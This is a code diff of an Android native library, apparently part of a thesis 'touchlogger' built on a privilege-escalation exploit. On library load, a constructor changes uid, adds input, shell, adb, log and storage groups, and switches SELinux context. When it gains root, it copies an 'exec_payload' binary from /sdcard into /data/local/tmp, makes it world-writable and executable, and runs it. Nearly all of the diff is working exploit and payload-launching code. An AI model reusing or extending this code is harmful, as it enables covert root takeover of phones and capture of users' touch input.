@@ -12,12 +12,16 @@
 #ifdef DEBUG
 
 #include <android/log.h>
-#include <fcntl.h>
+#include <sys/stat.h>
+#include "file_utils.h"
 
 #define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "dirty_load", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
 #else
 #define LOGV(...)
 #endif
+
+#define EXEC_PAYLOAD_SRC_PATH "/sdcard/exec_payload"
+#define EXEC_PAYLOAD_DST_PATH "/data/local/tmp/exec_payload"
 
 typedef int getcon_t(char **con);
 
@@ -48,17 +52,25 @@ __attribute__((constructor)) void say_hello()
         LOGV("setresuid failed: %s", strerror(errno));
         exit(0);
       }
+    }
 
-      gid_t groups[] = {1004};  // input
-      if (setgroups(sizeof(groups) / sizeof(groups[0]), groups) != 0)
-      {
-        LOGV("Unable to set groups: %s", strerror(errno));
-        exit(0);
-      }
-      else
-      {
-        LOGV("Set groups OK!");
-      }
+    gid_t groups[] = {
+        1004,  // input
+        2000,  // shell
+        1007,  // log
+        1011,  // adb
+        1015,  // sdcard_rw
+        1028,  // sdcard_r
+    };
+
+    if (setgroups(sizeof(groups) / sizeof(groups[0]), groups) != 0)
+    {
+      LOGV("Unable to set groups: %s", strerror(errno));
+      exit(0);
+    }
+    else
+    {
+      LOGV("Set groups OK!");
     }
 
     dlerror();
@@ -81,16 +93,6 @@ __attribute__((constructor)) void say_hello()
         char *secontext;
         int ret = (*getcon_p)(&secontext);
         LOGV("current context: %d %s", ret, secontext);
-
-        int data_fd = open("/data/data/org.leyfer.thesis.touchlogger_dirty/files/libshared_payload.so", O_RDONLY);
-        if (data_fd == -1)
-        {
-          LOGV("Unable to open libshared_payload.so for reading: %s", strerror(errno));
-        }
-        else
-        {
-          LOGV("Open libshared_payload.so success!");
-        }
 
         void *setcon = dlsym(selinux, "setcon");
         const char *error = dlerror();
@@ -120,7 +122,34 @@ __attribute__((constructor)) void say_hello()
     if (getuid() == 0)
     {
       LOGV("Got root");
-      if (execle("/data/local/tmp/exec_payload", "/data/local/tmp/exec_payload", (char*)NULL, environ) == -1)
+
+      struct stat exec_payload_stat;
+      if (stat(EXEC_PAYLOAD_DST_PATH, &exec_payload_stat) == -1)
+      {
+        LOGV("Unable to stat %s: %s!", EXEC_PAYLOAD_DST_PATH, strerror(errno));
+        if (errno == ENOENT)
+        {
+          LOGV("Will copy exec_payload from /sdcard");
+          if (stat(EXEC_PAYLOAD_SRC_PATH, &exec_payload_stat) == -1)
+          {
+            LOGV("Unable to open %s: %s!", EXEC_PAYLOAD_SRC_PATH, strerror(errno));
+            exit(0);
+          }
+
+          if (copy_file(EXEC_PAYLOAD_SRC_PATH, EXEC_PAYLOAD_DST_PATH) == -1)
+          {
+            LOGV("Unable to copy %s to %s!", EXEC_PAYLOAD_SRC_PATH, EXEC_PAYLOAD_DST_PATH);
+            exit(0);
+          }
+
+          if (chmod(EXEC_PAYLOAD_DST_PATH, 0777) == -1)
+          {
+            LOGV("Unable to chmod %s to 0777: %s!", EXEC_PAYLOAD_DST_PATH, strerror(errno));
+          }
+        }
+      }
+
+      if (execle(EXEC_PAYLOAD_DST_PATH, EXEC_PAYLOAD_DST_PATH, (char*)NULL, environ) == -1)
       {
         LOGV("Unable to exec payload: %s!", strerror(errno));
       }
